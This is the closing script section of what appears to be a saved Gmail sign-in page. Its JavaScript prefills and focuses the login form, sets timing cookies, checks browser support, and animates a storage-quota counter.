Zcr1ACNTyxT7UaHNsYHVJBgzIwgb1zAJUn3eow8598YBeTgPW0oVJM8XtNJHZarAH5dopGNaTT4i8C/uH4hbOEcJuZvF4njv5lHWG4T1xun3qqHbgVIOdRmovo0XgE1rbra+yVPnty/og3ulByWj5HeWCnCFX13bxUItH1i9qaCWQtj12X2taip/DRFDa5nBFRT9uYIi0wsAWJoiixdnOjhZtJIRTrRZOkeLHmEInk2ys=');
  </script>
<script>
    function gaia_parseFragment() {
        var hash = location.hash;
        var params = {};
        if (!hash) {
            return params;
        }
        var paramStrs = decodeURIComponent(hash.substring(1)).split('&');
        for (var i = 0; i < paramStrs.length; i++) {
            var param = paramStrs[i].split('=');
            params[param[0]] = param[1];
        }
        return params;
    }

    function gaia_prefillEmail() {
        var form = null;
        if (document.getElementById) {
            form = document.getElementById('gaia_loginform');
        }

        if (form && form.Email &&
        (form.Email.value == null || form.Email.value == '')
        && (form.Email.type != 'hidden')) {
            hashParams = gaia_parseFragment();
            if (hashParams['Email'] && hashParams['Email'] != '') {
                form.Email.value = hashParams['Email'];
            }
        }
    }


    try {
        gaia_prefillEmail();
    } catch (e) {
    }
  
</script>
<script>
    function gaia_setFocus() {
        var form = null;
        var isFocusableField = function (inputElement) {
            if (!inputElement) {
                return false;
            }
            if (inputElement.type != 'hidden' && inputElement.focus &&
  inputElement.style.display != 'none') {
                return true;
            }
            return false;
        };
        var isFocusableErrorField = function (inputElement) {
            if (!inputElement) {
                return false;
            }
            var hasError = inputElement.className.indexOf('form-error') > -1;
            if (hasError && isFocusableField(inputElement)) {
                return true;
            }
            return false;
        };
        var isFocusableEmptyField = function (inputElement) {
            if (!inputElement) {
                return false;
            }
            var isEmpty = inputElement.value == null || inputElement.value == '';
            if (isEmpty && isFocusableField(inputElement)) {
                return true;
            }
            return false;
        };
        if (document.getElementById) {
            form = document.getElementById('gaia_loginform');
        }
        if (form) {
            var userAgent = navigator.userAgent.toLowerCase();
            var formFields = form.getElementsByTagName('input');
            for (var i = 0; i < formFields.length; i++) {
                var currentField = formFields[i];
                if (isFocusableErrorField(currentField)) {
                    currentField.focus();

                    var currentValue = currentField.value;
                    currentField.value = '';
                    currentField.value = currentValue;
                    return;
                }
            }



            for (var j = 0; j < formFields.length; j++) {
                var currentField = formFields[j];
                if (isFocusableEmptyField(currentField)) {
                    currentField.focus();
                    return;
                }
            }

        }
    }



    gaia_attachEvent(window, 'load', gaia_setFocus);
  
  
</script>
<script>
    var gaia_scrollToElement = function (element) {
        var calculateOffsetHeight = function (element) {
            var curtop = 0;
            if (element.offsetParent) {
                while (element) {
                    curtop += element.offsetTop;
                    element = element.offsetParent;
                }
            }
            return curtop;
        }
        var siginOffsetHeight = calculateOffsetHeight(element);
        var scrollHeight = siginOffsetHeight - window.innerHeight +
  element.clientHeight + 0.02 * window.innerHeight;
        window.scroll(0, scrollHeight);
    }
</script>
<script>
    (function () {
        var signinInput = document.getElementById('signIn');
        gaia_onLoginSubmit = function () {
            try {
                document.bg.invoke(function (response) {
                    document.getElementById('bgresponse').value = response;
                });
            } catch (err) {
                document.getElementById('bgresponse').value = '';
            }
            return true;
        }
        document.getElementById('gaia_loginform').onsubmit = gaia_onLoginSubmit;
        var signinButton = document.getElementById('signIn');
        gaia_attachEvent(window, 'load', function () {
            gaia_scrollToElement(signinButton);
        });
    })();
</script>
  <script type="text/javascript">
      var BrowserSupport_ = { IsBrowserSupported: function () {
          var agt = navigator.userAgent.toLowerCase(); var is_op = agt.indexOf("opera") != -1; var is_ie = agt.indexOf("msie") != -1 && document.all && !is_op; var is_ie5 = agt.indexOf("msie 5") != -1 && document.all && !is_op; var is_mac = agt.indexOf("mac") != -1; var is_gk = agt.indexOf("gecko") != -1; var is_sf = agt.indexOf("safari") != -1; if (is_ie && !is_op && !is_mac) {
              if (agt.indexOf("palmsource") !=
-1 || agt.indexOf("regking") != -1 || agt.indexOf("windows ce") != -1 || agt.indexOf("j2me") != -1 || agt.indexOf("avantgo") != -1 || agt.indexOf(" stb") != -1) return false; var v = BrowserSupport_.GetFollowingFloat(agt, "msie "); if (v != null) return v >= 5.5
          } if (is_gk && !is_sf) {
              var v = BrowserSupport_.GetFollowingFloat(agt, "rv:"); if (v != null) return v >= 1.4; else {
                  v = BrowserSupport_.GetFollowingFloat(agt, "galeon/"); if (v != null) return v >=
1.3
              }
          } if (is_sf) { if (agt.indexOf("rv:3.14.15.92.65") != -1) return false; var v = BrowserSupport_.GetFollowingFloat(agt, "applewebkit/"); if (v != null) return v >= 312 } if (is_op) { if (agt.indexOf("sony/com1") != -1) return false; var v = BrowserSupport_.GetFollowingFloat(agt, "opera "); if (v == null) v = BrowserSupport_.GetFollowingFloat(agt, "opera/"); if (v != null) return v >= 8 } if (agt.indexOf("pda; sony/com2") != -1) return true; return false
      },
          GetFollowingFloat: function (str, pfx) { var i = str.indexOf(pfx); if (i != -1) { var v = parseFloat(str.substring(i + pfx.length)); if (!isNaN(v)) return v } return null }
      }; var is_browser_supported = BrowserSupport_.IsBrowserSupported()
  </script>
<script type=text/javascript>
<!--

    var start_time = (new Date()).getTime();

    if (top.location != self.location) {
        top.location = self.location.href;
    }

    function SetGmailCookie(name, value) {
        document.cookie = name + "=" + value + ";path=/;domain=.google.com";
    }

    function lg() {
        var now = (new Date()).getTime();

        var cookie = "T" + start_time + "/" + start_time + "/" + now;
        SetGmailCookie("GMAIL_LOGIN", cookie);
    }

    function StripParam(url, param) {
        var start = url.indexOf(param);
        if (start == -1) return url;
        var end = start + param.length;

        var charBefore = url.charAt(start - 1);
        if (charBefore != '?' && charBefore != '&') return url;

        var charAfter = (url.length >= end + 1) ? url.charAt(end) : '';
        if (charAfter != '' && charAfter != '&' && charAfter != '#') return url;
        if (charBefore == '&') {
            --start;
        } else if (charAfter == '&') {
            ++end;
        }
        return url.substring(0, start) + url.substring(end);
    }
    var fixed = 0;
    function FixForm() {
        if (is_browser_supported) {
            var form = el("gaia_loginform");
            if (form && form["continue"]) {
                var url = form["continue"].value;
                url = StripParam(url, "ui=html");
                url = StripParam(url, "zy=l");
                form["continue"].value = url;
            }
        }
        fixed = 1;
    }
    function el(id) {
        if (document.getElementById) {
            return document.getElementById(id);
        } else if (window[id]) {
            return window[id];
        }
        return null;
    }
    // Estimates of nanite storage generation over time.
    var CP = [
 [1224486000000, 7254],
 [1335290400000, 7704],
 [1335376800000, 10240],
 [2144908800000, 13531],
 [2147328000000, 43008],
 [46893711600000, Number.MAX_VALUE]
];
    var quota_elem;
    var ONE_PX = "https://mail.google.com/mail/images/c.gif?t=" +
  (new Date()).getTime();
    function LogRoundtripTime() {
        var img = new Image();
        var start = (new Date()).getTime();
        img.onload = GetRoundtripTimeFunction(start);
        img.src = ONE_PX;
    }
    function GetRoundtripTimeFunction(start) {
        return function () {
            var end = (new Date()).getTime();
            SetGmailCookie("GMAIL_RTT", (end - start));
        }
    }
    function MaybePingUser() {
        var f = el("gaia_loginform");
        if (f.Email.value) {
            new Image().src = 'https://mail.google.com/mail?gxlu=' +
  encodeURIComponent(f.Email.value) +
  '&zx=' + (new Date().getTime());
        }
    }
    function OnLoad() {
        MaybePingUser();
        var passwd_elem = el("Passwd");
        if (passwd_elem) {
            passwd_elem.onfocus = MaybePingUser;
        }
        LogRoundtripTime();
        if (!quota_elem) {
            quota_elem = el("quota");
            updateQuota();
        }
        LoadConversionScript();
    }
    function updateQuota() {
        if (!quota_elem) {
            return;
        }
        var now = (new Date()).getTime();
        var i;
        for (i = 0; i < CP.length; i++) {
            if (now < CP[i][0]) {
                break;
            }
        }
        if (i == 0) {
            setTimeout(updateQuota, 1000);
        } else if (i == CP.length) {
            quota_elem.innerHTML = CP[i - 1][1];
        } else {
            var ts = CP[i - 1][0];
            var bs = CP[i - 1][1];
            quota_elem.innerHTML = format(((now - ts) / (CP[i][0] - ts) * (CP[i][1] - bs)) + bs);
            setTimeout(updateQuota, 1000);
        }
    }

    var PAD = '.000000';

    function format(num) {
        var str = String(num);
        var dot = str.indexOf('.');
        if (dot < 0) {
            return str + PAD;
        } if (PAD.length > (str.length - dot)) {
            return str + PAD.substring(str.length - dot);
        } else {
            return str.substring(0, dot + PAD.length);
        }
    }
    var google_conversion_type = 'landing';
    var google_conversion_id = 1069902127;
    var google_conversion_language = "en_US";
    var google_conversion_format = "1";
    var google_conversion_color = "FFFFFF";
    function LoadConversionScript() {
        var script = document.createElement("script");
        script.type = "text/javascript";
        script.src = "https://www.googleadservices.com/pagead/conversion.js";
    }
// -->
</script>
<script>
    gaia_attachEvent(window, 'load', function () {
        OnLoad();
        FixForm();
    });
    (function () {
        var gaiaLoginForm = document.getElementById('gaia_loginform');
        var gaia_onsubmitHandler = gaiaLoginForm.onsubmit;
        gaiaLoginForm.onsubmit = function () {
            lg();
            if (!fixed) {
                FixForm();
            }
            gaia_onsubmitHandler();
        };
    })();
</script>
  </body>
</html>
